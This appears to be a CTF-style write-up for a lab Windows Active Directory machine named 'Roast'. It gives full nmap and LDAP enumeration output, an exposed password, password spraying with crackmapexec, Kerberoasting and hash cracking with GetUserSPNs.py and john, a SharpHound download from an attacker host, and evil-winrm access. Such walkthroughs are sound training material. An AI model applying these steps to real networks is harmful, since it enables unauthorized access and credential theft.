---
tags: [AD, Challenge, Video]
title: Roast
created: '2020-06-28T09:46:40.980Z'
modified: '2020-07-01T18:54:32.926Z'
---

# Roast
- IP: `172.31.3.2`
- OS: `Windows`
## Credentials
`dsmith:WelcomeToR04st`: `smb`, `rpc`
`crhodes:WelcomeToR04st`: `smb`, `rpc`, `winrm`
`roastsvc:!!!watermelon245`: `winrm`
## Enumeration
### Writeup
We can login with rpcclient: `rpcclient -I 172.31.3.2 -U '' -N ROAST0`

Using nmap, we scan ldap and find valid credentials: `dsmith:WelcomeToR04st`
We notice these credentials also work for `crhodes` using `crackmapexec smb 172.31.3.2 -u users -p WelcomeToR04st`
He can log in to winrm as well.

### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.3.2`
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-28 10:15:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: roast.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: roast.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ROAST0
|   NetBIOS_Domain_Name: ROAST0
|   NetBIOS_Computer_Name: ROAST
|   DNS_Domain_Name: roast.csl
|   DNS_Computer_Name: Roast.roast.csl
|   DNS_Tree_Name: roast.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2020-06-28T10:17:48+00:00
| ssl-cert: Subject: commonName=Roast.roast.csl
| Issuer: commonName=Roast.roast.csl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-15T10:25:48
| Not valid after:  2020-11-14T10:25:48
| MD5:   0646 9ad4 2c6c 51c6 2dc9 9a76 b034 3ab7
|_SHA-1: 7674 e681 5f0a 40b2 71b7 c393 2c27 217e fbb7 2ea0
|_ssl-date: 2020-06-28T10:18:28+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
```
- `nmap -n -sV --script "ldap* and not brute" -p 389 172.31.3.2`
```
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: roast.csl, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=roast,DC=csl
|       ldapServiceName: roast.csl:roast$@ROAST.CSL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=roast,DC=csl
|       serverName: CN=ROAST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=roast,DC=csl
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=roast,DC=csl
|       namingContexts: DC=roast,DC=csl
|       namingContexts: CN=Configuration,DC=roast,DC=csl
|       namingContexts: CN=Schema,CN=Configuration,DC=roast,DC=csl
|       namingContexts: DC=DomainDnsZones,DC=roast,DC=csl
|       namingContexts: DC=ForestDnsZones,DC=roast,DC=csl
|       isSynchronized: TRUE
|       highestCommittedUSN: 77882
|       dsServiceName: CN=NTDS Settings,CN=ROAST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=roast,DC=csl
|       dnsHostName: Roast.roast.csl
|       defaultNamingContext: DC=roast,DC=csl
|       currentTime: 20200628114048.0Z
|_      configurationNamingContext: CN=Configuration,DC=roast,DC=csl
| ldap-search: 
|   Context: DC=roast,DC=csl
|     dn: DC=roast,DC=csl
|     dn: CN=David Smith,OU=Roast,DC=roast,DC=csl
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: David Smith
|         sn: Smith
|         description: Your Password is WelcomeToR04st
|         givenName: David
|         distinguishedName: CN=David Smith,OU=Roast,DC=roast,DC=csl
|         instanceType: 4
|         whenCreated: 2020/05/15 06:30:43 UTC
|         whenChanged: 2020/05/15 21:42:47 UTC
|         displayName: David Smith
|         uSNCreated: 16572
|         uSNChanged: 32799
|         name: David Smith
|         objectGUID: 95a9772-f36-7344-9cc1-53d257cf635e
|         userAccountControl: 66048
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: 2020-05-15T20:33:54+00:00
|         lastLogoff: 0
|         lastLogon: 2020-05-17T21:35:26+00:00
|         logonHours: \xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF
|         pwdLastSet: 2020-05-15T20:32:41+00:00
|         primaryGroupID: 513
|         objectSid: 1-5-21-4133422454-1522376082-951199702-1103
|         accountExpires: Never
|         logonCount: 1
|         sAMAccountName: dsmith
|         sAMAccountType: 805306368
|         userPrincipalName: dsmith@roast.csl
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=roast,DC=csl
|         dSCorePropagationData: 2020/05/15 06:46:18 UTC
|         dSCorePropagationData: 2020/05/15 06:38:02 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         lastLogonTimestamp: 2020-05-15T20:34:41+00:00
|     dn: CN=Cody Rhodes,OU=Roast,DC=roast,DC=csl
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Cody Rhodes
|         sn: Rhodes
|         givenName: Cody
|         distinguishedName: CN=Cody Rhodes,OU=Roast,DC=roast,DC=csl
|         instanceType: 4
|         whenCreated: 2020/05/15 06:34:11 UTC
|         whenChanged: 2020/05/15 21:41:51 UTC
|         displayName: Cody Rhodes
|         uSNCreated: 16605
|         memberOf: CN=Remote Management Users,CN=Builtin,DC=roast,DC=csl
|         uSNChanged: 32794
|         name: Cody Rhodes
|         objectGUID: 264ab96b-32e6-7f47-9f71-45b9eae6ee8
|         userAccountControl: 66048
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: 2020-05-15T20:33:54+00:00
|         lastLogoff: 0
|         lastLogon: 2020-05-15T20:44:31+00:00
|         logonHours: \xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF
|         pwdLastSet: 2020-05-15T20:33:45+00:00
|         primaryGroupID: 513
|         objectSid: 1-5-21-4133422454-1522376082-951199702-1104
|         accountExpires: Never
|         logonCount: 2
|         sAMAccountName: crhodes
|         sAMAccountType: 805306368
|         userPrincipalName: crhodes@roast.csl
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=roast,DC=csl
|         dSCorePropagationData: 2020/05/15 06:46:18 UTC
|         dSCorePropagationData: 2020/05/15 06:37:46 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         lastLogonTimestamp: 2020-05-15T05:40:51+00:00
|     dn: CN=Steve Smith,OU=Roast,DC=roast,DC=csl
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Steve Smith
|         sn: Smith
|         givenName: Steve
|         distinguishedName: CN=Steve Smith,OU=Roast,DC=roast,DC=csl
|         instanceType: 4
|         whenCreated: 2020/05/15 06:35:06 UTC
|         whenChanged: 2020/05/15 06:38:17 UTC
|         displayName: Steve Smith
|         uSNCreated: 16612
|         uSNChanged: 16629
|         name: Steve Smith
|         objectGUID: 66dc74ae-c214-4e42-94e3-44092523e22
|         userAccountControl: 66048
|         badPwdCount: 2
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: 2020-05-15T20:33:54+00:00
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: 2020-05-15T05:27:00+00:00
|         primaryGroupID: 513
|         objectSid: 1-5-21-4133422454-1522376082-951199702-1105
|         accountExpires: 30828-09-14T01:39:59+00:00
|         logonCount: 0
|         sAMAccountName: ssmith
|         sAMAccountType: 805306368
|         userPrincipalName: ssmith@roast.csl
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=roast,DC=csl
|         dSCorePropagationData: 2020/05/15 06:46:18 UTC
|         dSCorePropagationData: 2020/05/15 06:38:17 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|_    dn: CN=Roast Svc,OU=Roast,DC=roast,DC=csl
Service Info: Host: ROAST; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```
</details>

<details>
<summary>enum4linux</summary>

- `enum4linux 172.31.3.2`
```
[+] Got domain/workgroup name: ROAST0
[+] Server 172.31.3.2 allows sessions using username '', password ''
```
</details>

## Enumeration as crhodes
### Writeup
We can run bloodhound.py and we see that there's a kerberoastable user roastsvc.
`GetUserSPNs.py -request -dc-ip 172.31.3.2 roast.csl/crhodes -outputfile hashes.kerberoast`
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast`
We get `roastsvc:!!!watermelon245`
### Commands

`AWS Lite Guest Agent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Autoload - No quotes and Space detected`

`Invoke-WebRequest "http://10.10.0.152/SharpHound.exe"`

`evil-winrm -i 172.31.3.2 -u roastsvc -p '!!!watermelon245'`

